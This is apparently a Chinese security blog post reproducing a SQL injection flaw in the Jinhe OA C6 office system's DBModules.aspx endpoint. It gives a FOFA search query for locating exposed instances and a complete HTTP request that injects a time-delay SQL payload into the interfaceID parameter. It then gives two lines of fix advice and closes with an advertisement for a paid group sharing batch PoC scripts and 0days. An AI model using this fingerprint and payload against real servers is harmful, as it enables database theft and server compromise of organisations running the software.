#  「漏洞复现」金和OA C6 DBModules.aspx SQL注入漏洞   
冷漠安全  冷漠安全   2024-08-24 07:38  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
金和OA协同办公管理系统软件（简称金和OA），本着简单、适用、高效的原则，贴合企事业单位的实际需求，实行通用化、标准化、智能化、人性化的产品设计，充分体现企事业单位规范管理、提高办公效率的核心思想，为用户提供一整套标准的办公自动化解决方案，以帮助企事业单位迅速建立便捷规范的办公环境。  
  
0x03  
  
**漏洞威胁**  
  
金和OA C6 DBModules.aspx 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="金和网络-金和OA"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rZquqvRdmJj9TF1iauPqdPgcxhfXBkjtHACLxRWR9SbqxvXMNkp4ibW7buw9AC5VfLiaoEKe799EyuA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```  
  
  延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rZquqvRdmJj9TF1iauPqdPgwGYA2uIhibkqkWgmSIGAl9IGReHffo2OVbbGOSA95Wffyibm8hzRCwGg/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rZquqvRdmJj9TF1iauPqdPgI3JzDULxcZ1zF1reQ7MyoDVWlicdibMvibyib3wc9sA0bQo0O2QUAicCT8A/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
使用预编译语句。  
  
对进入数据库的特殊字符进行转义处理。  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rZquqvRdmJj9TF1iauPqdPgIy2VdNCWkpgmOiag3qMfOEXxXibf5AutswtG2j0giax8EWXMicfNIERFNA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rZquqvRdmJj9TF1iauPqdPgSYmwibj3YcPb3Y2tP5CTqzwlcUgDib0M2n50A1F6og4nicoKxPWM3pkTA/640?wx_fmt=gif&from=appmsg "")  
  
  
